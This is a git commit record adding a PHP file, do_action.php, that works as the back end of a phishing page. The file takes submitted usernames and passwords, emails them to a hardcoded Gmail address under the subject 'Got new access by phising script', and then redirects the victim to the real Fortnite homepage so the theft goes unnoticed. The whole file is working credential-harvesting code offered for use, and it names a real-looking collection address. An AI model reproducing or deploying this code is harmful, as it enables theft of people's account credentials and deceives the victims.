a80165aa4782ce9773956f903d6e9dea607a67da
hamzasgh1998 <49130105+hamzasgh1998@users.noreply.github.com>
2020-12-30 22:20:58 +0100

    Add files via upload

---
+++ do_action.php
@@ -0,0 +1,23 @@
+<?php
+
+	function mail_sender(){
+		if(! ( isset($_REQUEST['username']) && isset($_REQUEST['password']) ) ){
+			return false;
+		}
+
+		$username = $_REQUEST['username'];
+		$password = $_REQUEST['password'];
+		
+		$reciever = "margote206@gmail.com";
+		
+		$subject = "Got new access by phising script";
+		$message = "The username is ". $username;
+		$message .= "and password is ". $password;
+		
+		return mail($reciever, $subject, $message);
+	}
+	
+	if(mail_sender()){
+		header("Location: https://www.epicgames.com/fortnite/en-US/home");
+	}
+?>
